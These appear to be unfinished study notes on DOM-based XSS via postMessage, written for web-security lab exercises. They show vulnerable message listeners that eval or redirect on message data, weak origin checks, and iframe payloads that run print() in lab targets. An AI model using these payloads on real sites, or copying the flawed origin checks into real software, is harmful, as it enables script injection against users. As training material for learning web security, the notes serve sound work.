## Sinks:
```
postMessage()
```
As long as a website accepts web message data from an untrusted source due to a lack of adequate origin verification, any sinks that are used by the incoming message event listener could potentially lead to vulnerabilities.
## Prevention:
You should avoid sending web messages that contain data that originated from any untrusted source, verify the origin of any incoming messages.

#### Example:
Vulnerable code:
```js
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```
Payload:
```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
````

#### Another example
```js
window.addEventListener('message', function(e) {
	var url = e.data;
	if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
		location.href = url;
	}
}, false);
```
payload
```html
<iframe src="https://0a1b00fa039e9b98b84c13430059007f.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

## Origin verification
```js
window.addEventListener('message', function(e) {
	if (e.origin.indexOf('normal-website.com') > -1) { 
		eval(e.data); 
	}
 })
```
also vulnerable:
```js
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```


## DOM XSS using web messages and `JSON.parse`
#to-be-continued 
```html
<iframe src="https://0ae500fa03973a108f40017e00e600b6.web-security-academy.net/"
onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
TODO - finish the lab